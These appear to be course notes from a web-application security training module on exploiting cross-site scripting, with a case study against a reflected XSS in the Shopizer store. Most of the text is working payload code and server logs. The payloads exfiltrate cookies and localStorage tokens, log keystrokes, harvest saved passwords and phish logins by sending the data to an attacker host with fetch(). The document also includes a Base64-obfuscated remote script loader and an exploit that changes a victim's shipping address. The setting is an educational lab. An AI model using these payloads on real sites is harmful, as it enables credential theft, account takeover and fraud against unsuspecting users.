# Module 6: Cross-Site Scripting Exploitation and Case Study

## Cross-Site Scripting - Exploitation

### Accessing The Sandbox

_Start your VPN, the VM, and add the VM's IP to your hosts file._

### Moving the Payload to an External Resource

_Serving xss.js_

{% code overflow="wrap" %}
```bash
kali@kali:~$ mkdir xss

kali@kali:~$ cd xss

kali@kali:~/xss$ echo "alert(1)" > xss.js

kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/1cdf68858b5006cbcca59265f49f7da7-xss_script_payload.png" alt=""><figcaption><p>Script payload on Search Application</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/1406992021dc6702b094465eaf42853f-xss_alert_script_payload.png" alt=""><figcaption><p>Script payload with Alert</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/f8f5d248ec6dc2deee5ac23e8ce101ef-xss_victim_script_payload.png" alt=""><figcaption><p>Script Payload loaded on victim</p></figcaption></figure>

_HTTP Server Logs_

{% code overflow="wrap" %}
```bash
kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.49.51 - - [19/Aug/2021 17:32:53] "GET /xss.js HTTP/1.1" 200 -
192.168.121.101 - - [19/Aug/2021 17:45:42] "GET /xss.js HTTP/1.1" 200 -
```
{% endcode %}

### Stealing Session Cookies

_Updating xss.js to exfiltrate the user's cookie_

{% code overflow="wrap" %}
```javascript
kali@kali:~/xss$ nano xss.js

kali@kali:~/xss$ cat xss.js
let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://192.168.49.51/exfil?data=" + encodedCookie)

kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/804e729feb00145795a81fb5dbbe1fa8-xss_alert_script_payload_fetch.png" alt=""><figcaption><p>Script Payload</p></figcaption></figure>

_Empty data parameter in log_

{% code overflow="wrap" %}
```bash
kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.49.51 - - [19/Aug/2021 19:07:14] "GET /xss.js HTTP/1.1" 200 -
192.168.49.51 - - [19/Aug/2021 19:07:14] code 404, message File not found
192.168.49.51 - - [19/Aug/2021 19:07:14] "GET /exfil?data= HTTP/1.1" 404 -
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/fd7c0062ed7cb0e2d842e3ea674e3d67-xss_rendered_httpOnly_payload.png" alt=""><figcaption><p>Rendered payload in victim browser</p></figcaption></figure>

_Cookie in HTTP log (Use Non-HttpOnly Cookie selected)_

{% code overflow="wrap" %}
```bash
192.168.121.101 - - [19/Aug/2021 19:25:11] "GET /xss.js HTTP/1.1" 200 -
192.168.121.101 - - [19/Aug/2021 19:25:12] code 404, message File not found
192.168.121.101 - - [19/Aug/2021 19:25:12] "GET /exfil?data=session%3DSomeExampleCookie HTTP/1.1" 404 -
```
{% endcode %}

_No Cookie in HTTP Log (Use HTTPOnly Cookie selected)_

```bash
192.168.121.101 - - [19/Aug/2021 19:27:36] "GET /xss.js HTTP/1.1" 200 -
192.168.121.101 - - [19/Aug/2021 19:27:36] code 404, message File not found
192.168.121.101 - - [19/Aug/2021 19:27:36] "GET /exfil?data= HTTP/1.1" 404 -
```

### Stealing Local Secrets

_Local storage is accessed by using the window.localStorage property, while session storage can be accessed with window.sessionStorage._

_Exfiltrating storage_

```javascript
kali@kali:~/xss$ nano xss.js

kali@kali:~/xss$ cat xss.js
let data = JSON.stringify(localStorage)

let encodedData = encodeURIComponent(data)

fetch("http://192.168.49.51/exfil?data=" + encodedData)

kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

<figure><img src="../../../.gitbook/assets/f0ad46abbc8224430f1c258b47551a88-xss_data_in_local.png" alt=""><figcaption><p>Rendering with data in local storage</p></figcaption></figure>

_Contents of the localStorage_

{% code overflow="wrap" %}
```bash
192.168.121.101 - - [19/Aug/2021 20:09:25] "GET /xss.js HTTP/1.1" 200 -
192.168.121.101 - - [19/Aug/2021 20:09:25] code 404, message File not found
192.168.121.101 - - [19/Aug/2021 20:09:25] "GET /exfil?data=%7B%22token%22%3A%22example-token%22%7D HTTP/1.1" 404 -
```
{% endcode %}

### Keylogging

_Keylogging payload in xss.js_

```javascript
kali@kali:~/xss$ nano xss.js

kali@kali:~/xss$ cat xss.js
function logKey(event){
        fetch("http://192.168.49.51/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);

kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

_Key Logging Search Application_

```bash
172.16.174.1 - - [20/Aug/2021 16:33:54] "GET /xss.js HTTP/1.1" 200 -
172.16.174.1 - - [20/Aug/2021 16:33:54] code 404, message File not found
172.16.174.1 - - [20/Aug/2021 16:33:54] "GET /k?key=D HTTP/1.1" 404 -
...
172.16.174.1 - - [20/Aug/2021 16:33:59] "GET /k?key=i HTTP/1.1" 404 -
```

### Stealing Saved Passwords

_Modifyin xss.js to steal passwords_

{% code overflow="wrap" %}
```javascript
kali@kali:~/xss$ nano xss.js

kali@kali:~/xss$ cat xss.js
  1  let body = document.getElementsByTagName("body")[0]
  2
  3  var u = document.createElement("input");
  4  u.type = "text";
  5  u.style.position = "fixed";
  6  //u.style.opacity = "0";
  7
  8  var p = document.createElement("input");
  9  p.type = "password";
 10  p.style.position = "fixed";
 11  //p.style.opacity = "0";
 12
 13  body.append(u)
 14  body.append(p)
 15
 16  setTimeout(function(){ 
 17          fetch("http://192.168.49.51/k?u=" + u.value + "&p=" + p.value)
 18   }, 5000);
 19

kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
{% endcode %}

<figure><img src="../../../.gitbook/assets/f5b216272f5fa919d380523a179483e1-xss_saved_creds_in_page.png" alt=""><figcaption><p>Saved creds on page</p></figcaption></figure>

_Saved credentials exfiltrated_

{% code overflow="wrap" %}
```bash
kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.49.51 - - [20/Aug/2021 19:26:56] "GET /xss.js HTTP/1.1" 200 -
192.168.49.51 - - [20/Aug/2021 19:27:01] code 404, message File not found
192.168.49.51 - - [20/Aug/2021 19:27:01] "GET /k?u=Ryuggy&p=ShavedHeadsFTW HTTP/1.1" 404 -
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/d2f9525f0ad514a80a61c4ce2602c99e-xss_saved_creds_in_page_opacity.png" alt=""><figcaption><p>Saved creds on page with opacity</p></figcaption></figure>

### Phishing Users

<figure><img src="../../../.gitbook/assets/fcdead632682c79f2fbf45cbbf3504fd-xss_search_login.png" alt=""><figcaption><p>Search Application Login</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/c1a5b8f7886d4258891abe0ab196026d-xss_inspect_form.png" alt=""><figcaption><p>Inspecting the Form</p></figcaption></figure>

_Payload to Phish with Login Form_

{% code overflow="wrap" %}
```javascript
fetch("login").then(res => res.text().then(data => {
	document.getElementsByTagName("html")[0].innerHTML = data
	document.getElementsByTagName("form")[0].action = "http://192.168.49.51"
	document.getElementsByTagName("form")[0].method = "get"
}))
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/0ed6b9bde013ee5b333dfb32b7af15e8-xss_phishing.png" alt=""><figcaption><p>Phishing the victim user</p></figcaption></figure>

_User Credentials in HTTP Logs_

{% code overflow="wrap" %}
```bash
kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.16.174.1 - - [26/Aug/2021 17:53:12] "GET /xss.js HTTP/1.1" 200 -
172.16.174.1 - - [26/Aug/2021 17:53:21] "GET /?username=gullible&password=IMaybeGullibleButMyPasswordsAreStrong HTTP/1.1" 200 -
```
{% endcode %}

_Creating xss.js as a login page due to no login page present_

{% code overflow="wrap" %}
```javascript
document.getElementsByTagName("html")[0].innerHTML = "<form action='http://192.168.49.51/cred' method='GET'><input type='text' placeholder='name@example.com' name='username'><input type='password' placeholder='Password' name='password'><button class='w-100 btn btn-lg btn-primary' type='submit'>Sign in</button></form>"
```
{% endcode %}

_Exploiting innerHTML to execute our script_

{% code overflow="wrap" %}
```javascript
<img src='x' onerror="const script = document.createElement('script'); script.src = 'http://192.168.45.219/phish.js'; script.async = true; document.body.appendChild(script);">
```
{% endcode %}

## Case Study: Shopizer Reflected XSS

### Getting Started

_Start VPN, VMs, and add IP to hosts file. Register an account._

### Discovering the Vulnerability

<figure><img src="../../../.gitbook/assets/966016326582a4fad77cddff4607159c-xss_case_shopizer_disco_01.png" alt=""><figcaption><p>Shopizer URL containing an interesting value</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/6db7336365c8f4f099e87b8637d10b29-xss_case_shopizer_disco_02.png" alt=""><figcaption><p>Searching the page source for c:2</p></figcaption></figure>

_The loadCategoryProducts() function_

{% code overflow="wrap" %}
```javascript
721  function loadCategoryProducts() {
722    var url = '/services/public/products/page/' + START_COUNT_PRODUCTS + '/' + MAX_PRODUCTS + '/DEFAULT/en/handbags';
723  	 	
724    if(filter!=null) {
725      url = url + '/filter=' + filter + '/filter-value=' + filterValue +'';
726    }
727  
728  
729    url = url + '?ref=c:2';
730  
731  
732    loadProducts(url,'#productsContainer');
733  
734  }
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/5ec8086ce8929f216867ab7ede2f1207-xss_case_shopizer_disco_04.png" alt=""><figcaption><p>Source code containing our canary value</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/14a8dfd3190740e4431cac1d540d1985-xss_case_shopizer_disco_05.png" alt=""><figcaption><p>The canary value including the single quote inside the JavaScript code</p></figcaption></figure>

_JavaScript error message due to our single quote_

{% code overflow="wrap" %}
```javascript
Uncaught SyntaxError: Unexpected identifier       ref=c:2'canary:729 
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/a99df86c9a80ee185e280bc503d0a463-xss_case_shopizer_disco_06.png" alt=""><figcaption><p>The application responding with an HTTP 404 when expanding our payload</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/afd53f6e383f63e5ed7cc51dc3d28082-xss_case_shopizer_disco_07.png" alt=""><figcaption><p>Replacing the semicolons with plus marks</p></figcaption></figure>

### Loading Remote Scripts

<figure><img src="../../../.gitbook/assets/7189d2b635a753bcf36aa61bbe10726a-xss_case_shopizer_further_01.png" alt=""><figcaption><p>Site map tool in Burp Suite</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/140aaf2256065141ba31feb4701c77d2-xss_case_shopizer_further_02.png" alt=""><figcaption><p>Listing of the JavaScript files loaded by Shopizer</p></figcaption></figure>

_Creating a simple JS file_

```bash
kali@kali:~$ mkdir ~/xss/
                    
kali@kali:~$ cd ~/xss/

kali@kali:~/xss$ nano xss.js

kali@kali:~/xss$ cat xss.js
alert('It worked!')

kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

<figure><img src="../../../.gitbook/assets/33ed3144ce654f468de9a48c939cf22d-xss_case_shopizer_further_03.png" alt=""><figcaption><p>Using Burp Suite Decoder to Base64-encode our jQuery.getScript() payload</p></figcaption></figure>

_Base64-encoded payload_

{% code overflow="wrap" %}
```javascript
'+eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDkuNTEveHNzLmpzJyk='))+'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/3daf43dde6629925b76044321af198a1-xss_case_shopizer_further_04.png" alt=""><figcaption><p>JavaScript alert window showing an error</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/d7f45c338a579d43007cb2b14aa7ea44-xss_case_shopizer_further_06.png" alt=""><figcaption><p>JavaScript Console Displaying Request Error</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/d9e2fd55912185a78e2ad2f81100d0ac-xss_case_shopizer_further_07.png" alt=""><figcaption><p>JavaScript Network Tab Displaying Request Error</p></figcaption></figure>

_Updated Base64-encoded payload_

{% code overflow="wrap" %}
```javascript
'+btoa(eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDkuNTEveHNzLmpzJyk=')))+'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/007ebe3c077f926a76d25b5f55eb1299-xss_case_shopizer_further_08.png" alt=""><figcaption><p>JavaScript alert windows showing "It worked!"</p></figcaption></figure>

### Exploiting Reflected XSS

<figure><img src="../../../.gitbook/assets/31fd17102bbfcf1e7daa4633e71652e1-xss_case_shopizer_exploit_01.png" alt=""><figcaption><p>My Account page in Shopizer</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/6d91dd1423b0f866e04ad950fbbafacb-xss_case_shopizer_exploit_02.png" alt=""><figcaption><p>Edit Shipping information form</p></figcaption></figure>

_Sample POST request to add or update an address_

{% code overflow="wrap" %}
```http
POST /shop/customer/updateAddress.html HTTP/1.1
Host: shopizer:8080
Content-Length: 161
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: http://shopizer:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://shopizer:8080/shop/customer/editAddress.html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: navigate-tinymce-scroll=%7B%7D; navigate-language=en; cookieconsent_status=dismiss; JSESSIONID=557F764BDD5F6574EF1E3B6E5A5F662D; user=DEFAULT_tom.jones@local.io
Connection: close

customerId=100&billingAddress=false&firstName=z&lastName=z&company=&address=z&city=z&country=AL&stateProvince=z&postalCode=z&phone=z&submitAddress=Change+address
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/a01c1a6dda6961cb9385d6027f476b1f-xss_case_shopizer_exploit_03.png" alt=""><figcaption><p>Updating a shipping address without including a "customerId"</p></figcaption></figure>

_Sample fetch() payload_

{% code overflow="wrap" %}
```javascript
01  fetch('http://shopizer:8080/shop/customer/updateAddress.html',{
02    method: 'POST',
03    mode: 'same-origin',
04    credentials: 'same-origin',
05    headers: {
06      'Content-Type':'application/x-www-form-urlencoded'
07    }, 
08    body:'customerId=&billingAddress=false&firstName=hax&lastName=hax&company=&address=hax&city=hax&country=AL&stateProvince=z&postalCode=z&phone=z&submitAddress=Change address'
09  })
```
{% endcode %}

_Serving the JS file_

{% code overflow="wrap" %}
```bash
kali@kali:~$ nano ~/xss/xss.js

kali@kali:~$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/439a20f4fc2510b7af5d797b839f43be-xss_case_shopizer_exploit_07.png" alt=""><figcaption><p>Loading the exploit URL</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/6f0f76793d80ec30a708de9c7333ba5f-xss_case_shopizer_exploit_08.png" alt=""><figcaption><p>Using Burp Suite to verify the POST request was sent</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/16064ff218955dbf7726ebe3072f4206-xss_case_shopizer_exploit_09.png" alt=""><figcaption><p>Verifying the address change on the My Account Page</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/300442fb74616925b1ec551ae0e28cfc-xss_case_shopizer_exploit_10.png" alt=""><figcaption><p>Loading payload in XSS Sandbox</p></figcaption></figure>

_HTTP Log Showing xss.js was Loaded_

{% code overflow="wrap" %}
```bash
kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.49.51 - - [02/Sep/2021 19:53:22] "GET /xss.js?_=1630626802542 HTTP/1.1" 200 -
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/c6e8e2c2c553ac1ffbe7ffee42f4275a-xss_case_shopizer_exploit_11.png" alt=""><figcaption><p>Rendering payload in XSS Sandbox</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/66b368b894aa67f14691543c0dda6e8a-xss_case_shopizer_exploit_12.png" alt=""><figcaption><p>Viewing the Victim's Address</p></figcaption></figure>
